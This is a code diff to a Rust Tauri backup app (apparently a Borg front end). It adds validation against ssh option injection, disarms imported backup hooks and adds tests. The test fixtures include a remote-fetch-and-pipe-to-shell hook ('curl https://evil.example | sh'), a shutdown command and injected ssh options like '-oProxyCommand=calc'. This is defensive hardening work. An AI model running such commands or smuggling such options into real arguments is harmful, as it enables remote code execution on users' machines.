@@ -55,6 +55,14 @@ async fn read_profiles(app: &tauri::AppHandle) -> Result<ProfilesData, String> {
 }
 
 async fn write_profiles(app: &tauri::AppHandle, data: &ProfilesData) -> Result<(), String> {
+    // Central save-path gate: no profile with option-like (leading `-`) or
+    // otherwise invalid fields is ever persisted, regardless of which command
+    // mutated it.
+    for profile in &data.profiles {
+        profile
+            .validate()
+            .map_err(|e| format!("profile '{}': {e}", profile.name))?;
+    }
     let dir = config_dir(app).await?;
     profiles::save(&dir, data).await
 }
@@ -137,6 +145,11 @@ pub async fn test_ssh_connection(
     user: String,
     key_path: Option<String>,
 ) -> Result<(), String> {
+    // Option-injection gate: ssh is spawned with direct argv, so a host or
+    // user beginning with `-` would be parsed as an ssh flag (e.g.
+    // `-oProxyCommand=...`) instead of part of the destination.
+    borg_core::config::reject_option_like("ssh_host", &host).map_err(|e| e.to_string())?;
+    borg_core::config::reject_option_like("ssh_user", &user).map_err(|e| e.to_string())?;
     let key = key_path.map(PathBuf::from);
     borg_core::ssh::test_connection(&host, port, &user, key.as_deref())
         .await
@@ -1969,19 +1982,30 @@ pub async fn export_profile(app: tauri::AppHandle, id: String, path: String) -> 
         .map_err(|e| e.to_string())
 }
 
-#[tauri::command]
-pub async fn import_profile(app: tauri::AppHandle, path: String) -> Result<Profile, String> {
-    let json = tokio::fs::read_to_string(&path)
-        .await
-        .map_err(|e| e.to_string())?;
+/// Parse and validate a profile export. Every field is validated (not just the
+/// repo), and imported pre/post-backup hooks are DISARMED: hooks run arbitrary
+/// shell commands, so a hook embedded in an imported file must never execute
+/// until the user re-enters it deliberately via the hooks settings.
+fn parse_imported_profile(json: &str) -> Result<Profile, String> {
     let mut imported: Profile =
-        serde_json::from_str(&json).map_err(|e| format!("invalid profile JSON: {}", e))?;
-    imported.repo.validate().map_err(|e| e.to_string())?;
+        serde_json::from_str(json).map_err(|e| format!("invalid profile JSON: {}", e))?;
+    imported.pre_backup = None;
+    imported.post_backup = None;
     let name = imported.name.trim().to_string();
     if name.is_empty() {
         return Err("imported profile has empty name".into());
     }
     imported.name = name;
+    imported.validate()?;
+    Ok(imported)
+}
+
+#[tauri::command]
+pub async fn import_profile(app: tauri::AppHandle, path: String) -> Result<Profile, String> {
+    let json = tokio::fs::read_to_string(&path)
+        .await
+        .map_err(|e| e.to_string())?;
+    let mut imported = parse_imported_profile(&json)?;
 
     let mut data = read_profiles(&app).await?;
     imported.id = profiles::make_profile_id(&imported.name, &data);
@@ -2243,6 +2267,79 @@ pub async fn import_recovery_key(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// A minimal valid profile export, with `extra` top-level fields merged in.
+    fn profile_json(extra: serde_json::Value) -> String {
+        let mut base = serde_json::json!({
+            "id": "imported",
+            "name": "Imported",
+            "repo": {
+                "ssh_host": "backup.example.com",
+                "ssh_port": 22,
+                "ssh_user": "borg",
+                "repo_path": "/data/repo",
+                "ssh_key_path": null
+            }
+        });
+        base.as_object_mut()
+            .unwrap()
+            .extend(extra.as_object().unwrap().clone());
+        serde_json::to_string(&base).unwrap()
+    }
+
+    #[test]
+    fn imported_profile_parses_when_valid() {
+        let profile = parse_imported_profile(&profile_json(serde_json::json!({}))).unwrap();
+        assert_eq!(profile.name, "Imported");
+    }
+
+    #[test]
+    fn imported_profile_hooks_are_disarmed() {
+        let json = profile_json(serde_json::json!({
+            "pre_backup": "curl https://evil.example | sh",
+            "post_backup": "shutdown /s"
+        }));
+        let profile = parse_imported_profile(&json).unwrap();
+        // Hooks reach a real shell sink (cmd /C, sh -c); imported ones must
+        // never be armed until the user re-enters them deliberately.
+        assert!(profile.pre_backup.is_none());
+        assert!(profile.post_backup.is_none());
+    }
+
+    #[test]
+    fn imported_profile_rejects_option_like_fields() {
+        for extra in [
+            serde_json::json!({"backup_selection": {"source_paths": ["--exclude=*"]}}),
+            serde_json::json!({"secondary_repo": {
+                "ssh_host": "", "ssh_port": 0, "ssh_user": "",
+                "repo_path": "-oProxyCommand=calc", "ssh_key_path": null
+            }}),
+            serde_json::json!({"archive_template": "--glob-archives"}),
+            serde_json::json!({"repo": {
+                "ssh_host": "", "ssh_port": 0, "ssh_user": "",
+                "repo_path": "-evil", "ssh_key_path": null
+            }}),
+        ] {
+            let json = profile_json(extra);
+            assert!(
+                parse_imported_profile(&json).is_err(),
+                "should reject: {json}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn test_ssh_connection_rejects_option_like_host_and_user() {
+        // Both must fail at the validation gate, before ssh is ever spawned.
+        let err = test_ssh_connection("-oProxyCommand=calc".into(), 22, "borg".into(), None)
+            .await
+            .unwrap_err();
+        assert!(err.contains("cannot start with '-'"), "got: {err}");
+        let err = test_ssh_connection("host.example.com".into(), 22, "-l".into(), None)
+            .await
+            .unwrap_err();
+        assert!(err.contains("cannot start with '-'"), "got: {err}");
+    }
 
     #[test]
     fn replacement_search_cancels_only_search_operations() {
